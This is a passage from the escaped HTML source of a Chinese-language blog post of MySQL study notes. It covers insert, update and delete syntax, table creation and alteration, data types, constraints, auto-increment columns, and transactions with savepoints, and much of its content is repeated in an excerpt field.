class=\"code\"><pre><span class=\"line\">create table copy3</span><br><span class=\"line\">select id, au_name</span><br><span class=\"line\">from autor</span><br><span class=\"line\">where nation=&#x27;中国&#x27;；</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>复制部分结构</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table copy4</span><br><span class=\"line\">select id, au_name</span><br><span class=\"line\">from author</span><br><span class=\"line\">where 0;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"常见的数据类型\"><a href=\"#常见的数据类型\" class=\"headerlink\" title=\"常见的数据类型\"></a>常见的数据类型</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">数值型：</span><br><span class=\"line\">\t\t整型</span><br><span class=\"line\">\t\t小数：</span><br><span class=\"line\">\t\t\t定点型</span><br><span class=\"line\">\t\t\t浮点型</span><br><span class=\"line\">字符型：</span><br><span class=\"line\">\t\t较短的文本：char、varchar</span><br><span class=\"line\">\t\t较长的文本：text，blob（较长的二进制数据）</span><br><span class=\"line\">日期型</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"整型\"><a href=\"#整型\" class=\"headerlink\" title=\"整型\"></a>整型</h4><ol>\n<li>分类：tinyint, smallint, mediumint, int\\integer, bigint</li>\n<li>特点：</li>\n</ol>\n<ul>\n<li>如果不设置无符号还是有符号，默认是有符号，如果想设置无符号，还需要添加unsigned关键字</li>\n<li>如果插入的数值超出了整型的范围，则插入的值为整型类型的最大值</li>\n</ul>\n<h4 id=\"小数\"><a href=\"#小数\" class=\"headerlink\" title=\"小数\"></a>小数</h4><ol>\n<li>分类：</li>\n</ol>\n<ul>\n<li>浮点型： float(M, D) , double(M, D)</li>\n<li>定点型：dec(M, D) , decimal(M, D)</li>\n</ul>\n<ol start=\"2\">\n<li>特点：</li>\n</ol>\n<ul>\n<li>M：整数部位+加小数部位的总长度</li>\n<li>D：小数部位长度</li>\n<li>如果超过范围，则插入临界值</li>\n<li>M，D可以省略，如果是decimal，则默认M是10,D是0，  若是float和double，则会根据插入数值的精度来决定</li>\n<li>定点型精确度较高，如果要求插入数值的精确度较高如货币运算则考虑使用定点型</li>\n</ul>\n<h4 id=\"字符型\"><a href=\"#字符型\" class=\"headerlink\" title=\"字符型\"></a>字符型</h4><p>较短的文本：char、varchar<br>较长的文本：text，blob（较长的二进制数据）</p>\n<ol>\n<li>特点：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">          写法        M的意思                      特点        空间的耗费    效率  </span><br><span class=\"line\">char     char(M)    最大的字符数，可以省略，默认为1  固定长度字符    比较耗费    较高</span><br><span class=\"line\">varchar  varchar(M) 最大的字符数，不可以省略        可变长度字符    比较节省    较低</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"日期型\"><a href=\"#日期型\" class=\"headerlink\" title=\"日期型\"></a>日期型</h4><ol>\n<li><p>分类：date 只保存日期</p>\n<p>​            time 只保存时间</p>\n<p>​            year 只保存年</p>\n<p>​            datetime 保存日期+时间</p>\n<p>​            timestamp 保存日期+时间</p>\n</li>\n<li><p>特点：</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t\t\t字节   范围          时区等的影响</span><br><span class=\"line\">datetime     8    1000-9999         不受</span><br><span class=\"line\">timestamp    4    1970-2038          受</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"常见约束\"><a href=\"#常见约束\" class=\"headerlink\" title=\"常见约束\"></a>常见约束</h3><ol>\n<li><p>含义：一种限制，用于限制表中的数据，为了保证表中数据的准确性和可靠性</p>\n</li>\n<li><p>分类：</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. not null: 非空用于保证该字段值不能为空</span><br><span class=\"line\">2. default： 默认，用于赋予该字段默认值</span><br><span class=\"line\">3. primary key: 主键，用于保证该字段的值具有唯一性，并且非空</span><br><span class=\"line\">4. unique：用于保证该字段的值的唯一性</span><br><span class=\"line\">5. check：检查约束【MySQL中不支持】 </span><br><span class=\"line\">6. foreing key:外键约束，用于限制俩个表的关系，用于保证该字段的值必须来自于主表的关联列的值，在从表添加外键约束，用于引用主表中某列的值</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>添加约束的时机：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 创建表时</span><br><span class=\"line\">2. 修改表时</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>约束的添加分类：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 列级约束：</span><br><span class=\"line\">\t直接在字段名和类型后面追加约束类型即可</span><br><span class=\"line\">\t六大约束语法上都支持，但外键约束没有效果</span><br><span class=\"line\">2. 表级约束：</span><br><span class=\"line\">\t在所有字段的最下面：constraint 约束名 约束类型（字段名）</span><br><span class=\"line\">\t除了非空、默认约束，其他都支持</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>主键与唯一：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t\t保证唯一性   是否允许为空   一个表中可以有多少个    是否允许组合</span><br><span class=\"line\">主键\t\tY\t\t\t\tN\t\t\t一个\t\t\t\t允许，不推荐</span><br><span class=\"line\">唯一\t\tY\t\t\t\tY\t\t\t多个 \t\t\t\t允许，不推荐</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>外键约束</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 要求在从表中设置外键关系</span><br><span class=\"line\">2. 从表的外键列的类型和主表的关联列的类型要求一致或兼容，名称无要求</span><br><span class=\"line\">3. 主表的关联列必须是一个key（一般是主键或唯一）</span><br><span class=\"line\">4. 插入数据时，先插入主表，再插入从表，删除时相反</span><br><span class=\"line\"># 添加外键约束：</span><br><span class=\"line\">alter table stuinfo add constraint 表名字 foreing key(majorid) references major(id);</span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li>修改表时添加约束：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 添加列级约束：</span><br><span class=\"line\">alter table 表名 modify column 字段名 字段类型 新约束</span><br><span class=\"line\">2. 添加表级约束：</span><br><span class=\"line\">alter table 表名 add [constraint 约束名] 约束类型（字段名） 【外键的引用】</span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li>修改表时删除约束：</li>\n</ol>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBXJgK.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBXJgK.png\"></p>\n<h3 id=\"标识列\"><a href=\"#标识列\" class=\"headerlink\" title=\"标识列\"></a>标识列</h3><ol>\n<li>又称为自增长列，可以不用手动的插入值，系统提供默认的序列值</li>\n<li>特点：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 标识列不一定要和主键搭配，但必须要和一个key搭配</span><br><span class=\"line\">2. 一个表至多只有一个标识列</span><br><span class=\"line\">3. 标识列的类型只能是数值型</span><br><span class=\"line\">4.标识列可以通过 set auto_increment_incremennt= ;设置步长</span><br><span class=\"line\">\t可以通过手动插入值，设置起始值</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>修改表时设置标识列</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table 表名 modify column 字段值 类型 key名 auto_incerment;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>修改表时删除标识列</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table 表名 modify column 字段值 类型；</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"TCL语言\"><a href=\"#TCL语言\" class=\"headerlink\" title=\"TCL语言\"></a>TCL语言</h2><ol>\n<li><p>事务控制语言，一个或一组sql语句组成一个执行单元，这个执行单元要么全部执行，要么全部不执行，比如转账的过程</p>\n</li>\n<li><p>事务的特性</p>\n</li>\n</ol>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBXYjO.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBXYjO.png\"></p>\n<ol start=\"3\">\n<li>事务的创建</li>\n</ol>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBX89x.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBX89x.png\"></p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBXNuD.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBXNuD.png\"></p>\n<ul>\n<li>实例</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBXG36.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBXG36.png\"></p>\n<ol start=\"5\">\n<li>事务隔离级别</li>\n</ol>\n<p><a href=\"https://imgtu.com/i/NBjXy8\"><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBjXy8.md.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBjXy8.md.png\"></a></p>\n<p><a href=\"https://imgtu.com/i/NBjOQf\"><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBjOQf.md.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBjOQf.md.png\"></a></p>\n<ul>\n<li>MySQL中默认隔离级别 repeatable read</li>\n<li>oracle中默认级别 read committed</li>\n<li>查看隔离级别 ：select @@tx_isolation;</li>\n<li>设置隔离级别 ：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set session 或 global transaction isolation level 隔离级别；</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"6\">\n<li>savepoint 节点名，设置保存点</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 演示savepoint的使用</span><br><span class=\"line\">set autocommit = 0;</span><br><span class=\"line\">start transaction;</span><br><span class=\"line\">delete from account where id=25;</span><br><span class=\"line\">savepoint a;  #设置保存点</span><br><span class=\"line\">delete from account where id=28;</span><br><span class=\"line\">rollback to a;  #回滚到保存点</span><br><span class=\"line\"></span><br><span class=\"line\">select * from account;</span><br><span class=\"line\"></span><br><span class=\"line\">结果：id=28还在，id=25没有</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n","site":{"data":{}},"excerpt":"<h1 id=\"数据库（二）\"><a href=\"#数据库（二）\" class=\"headerlink\" title=\"数据库（二）\"></a>数据库（二）</h1><p><a href=\"https://www.bilibili.com/video/BV12b411K7Zu/?p=105\">参考的相关视频资料连接</a></p>\n<h2 id=\"DML语言\"><a href=\"#DML语言\" class=\"headerlink\" title=\"DML语言\"></a>DML语言</h2><ul>\n<li>数据操作语言：<ul>\n<li>插入：insert</li>\n<li>修改：update</li>\n<li>删除：delete</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"插入语句\"><a href=\"#插入语句\" class=\"headerlink\" title=\"插入语句\"></a>插入语句</h3><h4 id=\"方式一：经典插入语句\"><a href=\"#方式一：经典插入语句\" class=\"headerlink\" title=\"方式一：经典插入语句\"></a>方式一：经典插入语句</h4>","more":"<ul>\n<li>语法</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into 表名（列名1, 列名2, ...）</span><br><span class=\"line\">values （值1, 值2, ...）;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>注意事项：<ol>\n<li>插入的值的类型与列的类型一致或兼容</li>\n<li>可以为NULL的列可以插入NULL值，不为NULL的列必须插入值</li>\n<li>列的顺序可以调换，但是插入的值必须和列相匹配</li>\n<li>列数和值得个数必须相一致</li>\n<li>可以省略列名，默认所有列，而且列的顺序和表中的顺序一致</li>\n</ol>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into beauty</span><br><span class=\"line\">values(列1, 列2, ...);            //省略列名，默认所有列</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"方式二：\"><a href=\"#方式二：\" class=\"headerlink\" title=\"方式二：\"></a>方式二：</h4><ol>\n<li>语法：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into 表名</span><br><span class=\"line\">set 列名1=值1，列名2=值2，...</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>案例:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into beauty</span><br><span class=\"line\">set id=19, name=&#x27;章子怡&#x27;，phone=&#x27;110&#x27;;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h4><ol>\n<li>方式一支持插入多行，方式二不行</li>\n<li>方式一支持子查询，方式二不行</li>\n</ol>\n<h3 id=\"修改语句\"><a href=\"#修改语句\" class=\"headerlink\" title=\"修改语句\"></a>修改语句</h3><h4 id=\"修改单表的记录（-重点）\"><a href=\"#修改单表的记录（-重点）\" class=\"headerlink\" title=\"修改单表的记录（*重点）\"></a>修改单表的记录（*重点）</h4><ol>\n<li>语法：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">update 表名</span><br><span class=\"line\">set 列=新值，列=新值，...</span><br><span class=\"line\">where 筛选条件；</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>案例：修改boys表中id号位2的名称为张飞，魅力值10</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">update boys set boyname=&#x27;张飞&#x27;， usercp=10</span><br><span class=\"line\">where id=2;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改多表得记录-了解即可\"><a href=\"#修改多表得记录-了解即可\" class=\"headerlink\" title=\"修改多表得记录(了解即可)\"></a>修改多表得记录(了解即可)</h4><ol>\n<li>语法：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sql92语法：</span><br><span class=\"line\">update 表1 别名， 表2 别名</span><br><span class=\"line\">set 列=值，...</span><br><span class=\"line\">where 连接条件</span><br><span class=\"line\">and 筛选条件</span><br><span class=\"line\"></span><br><span class=\"line\">sql99语法：</span><br><span class=\"line\">update 表1 别名</span><br><span class=\"line\">inner 连接类型 join 表2 别名</span><br><span class=\"line\">on 链接条件</span><br><span class=\"line\">set 列=值，...</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"删除语句\"><a href=\"#删除语句\" class=\"headerlink\" title=\"删除语句\"></a>删除语句</h3><ol>\n<li>方式一：delete </li>\n</ol>\n<ul>\n<li>删除整行</li>\n<li>单表的删除</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">语法：</span><br><span class=\"line\">delete from 表名 where 筛选条件</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>案例：删除手机号以3结尾的女孩信息</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delete from girls </span><br><span class=\"line\">where phon like &#x27;%3&#x27;;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>方式二：truncate</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">语法：</span><br><span class=\"line\">truncate table 表名</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>案例：将魅力值&gt;100的男神信息删除</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">truncate table boys;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"DDL语言\"><a href=\"#DDL语言\" class=\"headerlink\" title=\"DDL语言\"></a>DDL语言</h2><ol>\n<li>DDL数据定义语言</li>\n<li>表和库的管理</li>\n</ol>\n<h3 id=\"库的操作\"><a href=\"#库的操作\" class=\"headerlink\" title=\"库的操作\"></a>库的操作</h3><ol>\n<li>库的创建</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create database (if not exists)库名；</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>库的删除</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drop database if exists 库名；</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"表的管理\"><a href=\"#表的管理\" class=\"headerlink\" title=\"表的管理\"></a>表的管理</h3><ol>\n<li>表的创建</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create  table 表名(</span><br><span class=\"line\">\t列名 列的类型【(长度) (约束)】，  //长度和约束可选</span><br><span class=\"line\">\t列名 列的类型【(长度) (约束)】，</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)；</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>案例：创建表Book</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">creat table book(</span><br><span class=\"line\">\tid int, #编号</span><br><span class=\"line\">\tbname varchar (20),  #图书名</span><br><span class=\"line\">\tauthorid int,  #作者编号</span><br><span class=\"line\">\tpublishdate datetime;  #出版日期</span><br><span class=\"line\">)；</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"2\">\n<li>表的修改</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table 表名 关键字 column 列名 列类型 约束</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>修改列名</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//参考上个案例，创建表book</span><br><span class=\"line\">alter table book change aolumn publish pubdate datetime;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>修改列的类型或约束</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table book modify column pubtade timestamp;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>添加新列</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table author add column annual double;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>删除列</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table author drop column annual;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>修改表名</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table  author rename to book_author;</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"3\">\n<li>表的删除</li>\n</ol>\n<ul>\n<li>语法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drop table if exists book_author;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>通用的写法：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drop database if exists 旧库名；</span><br><span class=\"line\">create database 新库名；</span><br><span class=\"line\"></span><br><span class=\"line\">drop table if exists 旧表名；</span><br><span class=\"line\">create table 表名（）；</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"4\">\n<li>表的复制</li>\n</ol>\n<ul>\n<li>复制表的结构</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table copy like author;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>复制表的结构+数据</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table copy2</span><br><span class=\"line\">select * from author;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>只复制部分数据</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table copy3</span><br><span class=\"line\">select id, au_name</span><br><span class=\"line\">from autor</span><br><span class=\"line\">where nation=&#x27;中国&#x27;；</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>复制部分结构</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table copy4</span><br><span class=\"line\">select id, au_name</span><br><span class=\"line\">from author</span><br><span class=\"line\">where 0;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"常见的数据类型\"><a href=\"#常见的数据类型\" class=\"headerlink\" title=\"常见的数据类型\"></a>常见的数据类型</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">数值型：</span><br><span class=\"line\">\t\t整型</span><br><span class=\"line\">\t\t小数：</span><br><span class=\"line\">\t\t\t定点型</span><br><span class=\"line\">\t\t\t浮点型</span><br><span class=\"line\">字符型：</span><br><span class=\"line\">\t\t较短的文本：char、varchar</span><br><span class=\"line\">\t\t较长的文本：text，blob（较长的二进制数据）</span><br><span class=\"line\">日期型</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"整型\"><a href=\"#整型\" class=\"headerlink\" title=\"整型\"></a>整型</h4><ol>\n<li>分类：tinyint, smallint, mediumint, int\\integer, bigint</li>\n<li>特点：</li>\n</ol>\n<ul>\n<li>如果不设置无符号还是有符号，默认是有符号，如果想设置无符号，还需要添加unsigned关键字</li>\n<li>如果插入的数值超出了整型的范围，则插入的值为整型类型的最大值</li>\n</ul>\n<h4 id=\"小数\"><a href=\"#小数\" class=\"headerlink\" title=\"小数\"></a>小数</h4><ol>\n<li>分类：</li>\n</ol>\n<ul>\n<li>浮点型： float(M, D) , double(M, D)</li>\n<li>定点型：dec(M, D) , decimal(M, D)</li>\n</ul>\n<ol start=\"2\">\n<li>特点：</li>\n</ol>\n<ul>\n<li>M：整数部位+加小数部位的总长度</li>\n<li>D：小数部位长度</li>\n<li>如果超过范围，则插入临界值</li>\n<li>M，D可以省略，如果是decimal，则默认M是10,D是0，  若是float和double，则会根据插入数值的精度来决定</li>\n<li>定点型精确度较高，如果要求插入数值的精确度较高如货币运算则考虑使用定点型</li>\n</ul>\n<h4 id=\"字符型\"><a href=\"#字符型\" class=\"headerlink\" title=\"字符型\"></a>字符型</h4><p>较短的文本：char、varchar<br>较长的文本：text，blob（较长的二进制数据）</p>\n<ol>\n<li>特点：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">          写法        M的意思                      特点        空间的耗费    效率  </span><br><span class=\"line\">char     char(M)    最大的字符数，可以省略，默认为1  固定长度字符    比较耗费    较高</span><br><span class=\"line\">varchar  varchar(M) 最大的字符数，不可以省略        可变长度字符    比较节省    